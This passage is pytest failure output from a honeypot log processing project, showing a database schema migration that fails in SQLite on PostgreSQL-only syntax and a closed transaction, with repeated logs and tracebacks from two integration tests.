2025-10-18 17:39:14,599:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 17:39:14,606:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 17:39:14,608:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 17:39:14,609:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 17:39:14,611:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 17:39:14,612:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 17:39:14,614:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 17:39:14,615:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 17:39:14,616:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 17:39:14,617:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 17:39:14,618:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 17:39:14,619:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 17:39:14,620:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 17:39:14,620:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:39:14,621:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:39:14,621:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:39:14,622:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:39:14,622:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:39:14,623:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
------------------------------ Captured log call -------------------------------
WARNING  cowrieprocessor.cli.cowrie_db:cowrie_db.py:146 Could not get schema version: (sqlite3.OperationalError) no such table: schema_state
[SQL: SELECT value FROM schema_state WHERE key = 'schema_version']
(Background on this error at: https://sqlalche.me/e/20/e3q8)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Set default source_generation values
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Create unique index on raw_events
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate session_id from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_type from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_timestamp from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for files.vt_malicious will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:418 Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
INFO     cowrieprocessor.db.migrations:migrations.py:683 Starting snowshoe detection schema migration (v8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
INFO     cowrieprocessor.db.migrations:migrations.py:725 Snowshoe detection schema migration (v8) completed successfully
____________ TestCowrieDatabaseCLI.test_cowrie_database_files_stats ____________

self = <cowrieprocessor.cli.cowrie_db.CowrieDatabase object at 0x7756b2ff1e50>
target_version = None, dry_run = False

    def migrate(self, target_version: Optional[int] = None, dry_run: bool = False) -> Dict[str, Any]:
        """Run database schema migrations.
    
        Args:
            target_version: Target schema version (None for latest)
            dry_run: Show what would be done without executing
    
        Returns:
            Migration result with details
        """
        # Check if database file exists
        if self._is_sqlite():
            db_path = self.db_url.replace("sqlite:///", "")
            db_exists = Path(db_path).exists()
        else:
            # For PostgreSQL, assume database exists if we can connect
            db_exists = True
    
        if not db_exists:
            current_version = 0
        else:
            current_version = self.get_schema_version()
    
        target = target_version or CURRENT_SCHEMA_VERSION
    
        result = {
            'current_version': current_version,
            'target_version': target,
            'migrations_applied': [],
            'dry_run': dry_run,
        }
    
        if current_version >= target:
            result['message'] = f"Database already at version {current_version}"
            return result
    
        if dry_run:
            result['migrations_applied'] = [f"Migration to version {v}" for v in range(current_version + 1, target + 1)]
            result['message'] = f"Would migrate from v{current_version} to v{target}"
            return result
    
        try:
            # Apply migrations directly - this handles creating tables if they don't exist
>           final_version = apply_migrations(self._get_engine())

/home/speterson/cowrieprocessor/cowrieprocessor/cli/cowrie_db.py:192: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:182: in apply_migrations
    _set_schema_version(connection, 8)
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:132: in _set_schema_version
    result = connection.execute(stmt)
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1419: in execute
    return meth(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/sql/elements.py:526: in _execute_on_connection
    return connection._execute_clauseelement(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1641: in _execute_clauseelement
    ret = self._execute_context(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1836: in _execute_context
    TransactionalContext._trans_ctx_check(self)
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

cls = <class 'sqlalchemy.engine.util.TransactionalContext'>
subject = <sqlalchemy.engine.base.Connection object at 0x7756b2fca650>

    @classmethod
    def _trans_ctx_check(cls, subject: _TConsSubject) -> None:
        trans_context = subject._trans_context_manager
        if trans_context:
            if not trans_context._transaction_is_active():
>               raise exc.InvalidRequestError(
                    "Can't operate on closed transaction inside context "
                    "manager.  Please complete the context manager "
                    "before emitting further commands."
                )
E               sqlalchemy.exc.InvalidRequestError: Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.

/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/util.py:111: InvalidRequestError

The above exception was the direct cause of the following exception:

self = <test_cli_tools.TestCowrieDatabaseCLI object at 0x7756b4676060>

    def test_cowrie_database_files_stats(self) -> None:
        """Test files table statistics."""
        with tempfile.NamedTemporaryFile(suffix=".sqlite", delete=False) as tmp_file:
            db_path = tmp_file.name
    
        try:
            db_url = f"sqlite:///{db_path}"
            db = CowrieDatabase(db_url)
    
            # Apply migrations first
>           db.migrate()

/home/speterson/cowrieprocessor/tests/integration/test_cli_tools.py:99: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

self = <cowrieprocessor.cli.cowrie_db.CowrieDatabase object at 0x7756b2ff1e50>
target_version = None, dry_run = False

    def migrate(self, target_version: Optional[int] = None, dry_run: bool = False) -> Dict[str, Any]:
        """Run database schema migrations.
    
        Args:
            target_version: Target schema version (None for latest)
            dry_run: Show what would be done without executing
    
        Returns:
            Migration result with details
        """
        # Check if database file exists
        if self._is_sqlite():
            db_path = self.db_url.replace("sqlite:///", "")
            db_exists = Path(db_path).exists()
        else:
            # For PostgreSQL, assume database exists if we can connect
            db_exists = True
    
        if not db_exists:
            current_version = 0
        else:
            current_version = self.get_schema_version()
    
        target = target_version or CURRENT_SCHEMA_VERSION
    
        result = {
            'current_version': current_version,
            'target_version': target,
            'migrations_applied': [],
            'dry_run': dry_run,
        }
    
        if current_version >= target:
            result['message'] = f"Database already at version {current_version}"
            return result
    
        if dry_run:
            result['migrations_applied'] = [f"Migration to version {v}" for v in range(current_version + 1, target + 1)]
            result['message'] = f"Would migrate from v{current_version} to v{target}"
            return result
    
        try:
            # Apply migrations directly - this handles creating tables if they don't exist
            final_version = apply_migrations(self._get_engine())
            result['final_version'] = final_version
            result['migrations_applied'] = [
                f"Applied migration to version {v}" for v in range(current_version + 1, final_version + 1)
            ]
            result['message'] = f"Successfully migrated to version {final_version}"
    
        except Exception as e:
            result['error'] = str(e)
            result['message'] = f"Migration failed: {e}"
>           raise Exception(f"Migration failed: {e}") from e
E           Exception: Migration failed: Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.

/home/speterson/cowrieprocessor/cowrieprocessor/cli/cowrie_db.py:202: Exception
----------------------------- Captured stdout call -----------------------------
2025-10-18 17:39:15,188:WARNING:cowrieprocessor.cli.cowrie_db:cowrie_db.py:get_schema_version:Could not get schema version: (sqlite3.OperationalError) no such table: schema_state
[SQL: SELECT value FROM schema_state WHERE key = 'schema_version']
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 17:39:15,279:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 17:39:15,280:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 17:39:15,287:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 17:39:15,289:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 17:39:15,292:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 17:39:15,294:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 17:39:15,295:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 17:39:15,298:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 17:39:15,299:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 17:39:15,300:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 17:39:15,302:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 17:39:15,302:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 17:39:15,305:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 17:39:15,306:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 17:39:15,307:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:39:15,307:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:39:15,308:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:39:15,308:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:39:15,309:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:39:15,309:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
------------------------------ Captured log call -------------------------------
WARNING  cowrieprocessor.cli.cowrie_db:cowrie_db.py:146 Could not get schema version: (sqlite3.OperationalError) no such table: schema_state
[SQL: SELECT value FROM schema_state WHERE key = 'schema_version']
(Background on this error at: https://sqlalche.me/e/20/e3q8)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Set default source_generation values
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Create unique index on raw_events
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate session_id from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_type from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_timestamp from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for files.vt_malicious will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:418 Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
INFO     cowrieprocessor.db.migrations:migrations.py:683 Starting snowshoe detection schema migration (v8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
INFO     cowrieprocessor.db.migrations:migrations.py:725 Snowshoe detection schema migration (v8) completed successfully
__________ TestCowrieDatabaseCLI.test_cowrie_database_backfill_files ___________

self = <cowrieprocessor.cli.cowrie_db.CowrieDatabase object at 0x7756b3c5a8b0>
target_version = None, dry_run = False

    def migrate(self, target_version: Optional[int] = None, dry_run: bool = False) -> Dict[str, Any]:
        """Run database schema migrations.
    
        Args:
            target_version: Target schema version (None for latest)
            dry_run: Show what would be done without executing
    
        Returns:
            Migration result with details
        """
        # Check if database file exists
        if self._is_sqlite():
            db_path = self.db_url.replace("sqlite:///", "")
            db_exists = Path(db_path).exists()
        else:
            # For PostgreSQL, assume database exists if we can connect
            db_exists = True
    
        if not db_exists:
            current_version = 0
        else:
            current_version = self.get_schema_version()
    
        target = target_version or CURRENT_SCHEMA_VERSION
    
        result = {
            'current_version': current_version,
            'target_version': target,
            'migrations_applied': [],
            'dry_run': dry_run,
        }
    
        if current_version >= target:
            result['message'] = f"Database already at version {current_version}"
            return result
    
        if dry_run:
            result['migrations_applied'] = [f"Migration to version {v}" for v in range(current_version + 1, target + 1)]
            result['message'] = f"Would migrate from v{current_version} to v{target}"
            return result
    
        try:
            # Apply migrations directly - this handles creating tables if they don't exist
>           final_version = apply_migrations(self._get_engine())

/home/speterson/cowrieprocessor/cowrieprocessor/cli/cowrie_db.py:192: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:182: in apply_migrations
    _set_schema_version(connection, 8)
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:132: in _set_schema_version
    result = connection.execute(stmt)
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1419: in execute
    return meth(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/sql/elements.py:526: in _execute_on_connection
    return connection._execute_clauseelement(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1641: in _execute_clauseelement
    ret = self._execute_context(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1836: in _execute_context
    TransactionalContext._trans_ctx_check(self)
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

cls = <class 'sqlalchemy.engine.util.TransactionalContext'>
subject = <sqlalchemy.engine.base.Connection object at 0x7756b30f24e0>

    @classmethod
    def _trans_ctx_check(cls, subject: _TConsSubject) -> None:
        trans_context = subject._trans_context_manager
        if trans_context:
            if not trans_context._transaction_is_active():
>               raise exc.InvalidRequestError(
                    "Can't operate on closed transaction inside context "
                    "manager.  Please complete the context manager "
                    "before emitting further commands."
                )
E               sqlalchemy.exc.InvalidRequestError: Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.

/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/util.py:111: InvalidRequestError

The above exception was the direct cause of the following exception:

self = <test_cli_tools.TestCowrieDatabaseCLI object at 0x7756b4676190>

    def test_cowrie_database_backfill_files(self) -> None:
        """Test files table backfill functionality."""
        with tempfile.NamedTemporaryFile(suffix=".sqlite", delete=False) as tmp_file:
            db_path = tmp_file.name
    
        try:
            db_url = f"sqlite:///{db_path}"
            db = CowrieDatabase(db_url)
    
            # Apply migrations first
>           db.migrate()

/home/speterson/cowrieprocessor/tests/integration/test_cli_tools.py:128: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

self = <cowrieprocessor.cli.cowrie_db.CowrieDatabase object at 0x7756b3c5a8b0>
target_version = None, dry_run = False

    def migrate(self, target_version: Optional[int] = None, dry_run: bool = False) -> Dict[str, Any]:
        """Run database schema migrations.
    
        Args:
            target_version: Target schema version (None for latest)
            dry_run: Show what would be done without executing
    
        Returns:
            Migration result with details
        """
        # Check if database file exists
        if self._is_sqlite():
            db_path = self.db_url.replace("sqlite:///", "")
            db_exists = Path(db_path).exists()
        else:
            # For PostgreSQL, assume database exists if we can connect
            db_exists = True
    
        if not db_exists:
            current_version = 0
        else:
            current_version = self.get_schema_version()
    
        target = target_version or CURRENT_SCHEMA_VERSION
    
        result = {
            'current_version': current_version,
            'target_version': target,
            'migrations_applied': [],
            'dry_run': dry_run,
        }
    
        if current_version >= target:
            result['message'] = f"Database already at version {current_version}"
            return result
    
        if dry_run:
            result['migrations_applied'] = [f"Migration to version {v}" for v in range(current_version + 1, target + 1)]
            result['message'] = f"Would migrate from v{current_version} to v{target}"
            return result
    
        try:
            # Apply migrations directly - this handles creating tables if they don't exist
            final_version = apply_migrations(self._get_engine())
            result['final_version'] = final_version
            result['migrations_applied'] = [
                f"Applied migration to version {v}" for v in range(current_version + 1, final_version + 1)
            ]
            result['message'] = f"Successfully migrated to version {final_version}"
    
        except Exception as e:
            result['error'] = str(e)
            result['message'] = f"Migration failed: {e}"
>           raise Exception(f"Migration failed: {e}") from e
E           Exception: Migration failed: Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.

/home/speterson/cowrieprocessor/cowrieprocessor/cli/cowrie_db.py:202: Exception
----------------------------- Captured stdout call -----------------------------
2025-10-18 17:39:15,861:WARNING:cowrieprocessor.cli.cowrie_db:cowrie_db.py:get_schema_version:Could not get schema version: (sqlite3.OperationalError) no such table: schema_state
[SQL: SELECT value FROM schema_state WHERE key = 'schema_version']
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 17:39:15,953:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 17:39:15,954:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 17:39:15,962:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 17:39:15,963:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 17:39:15,964:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 17:39:15,966:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 17:39:15,968:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 17:39:15,969:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 17:39:15,970:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 17:39:15,971:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 17:39:15,980:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 17:39:15,981:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 17:39:15,982:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 17:39:15,982:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
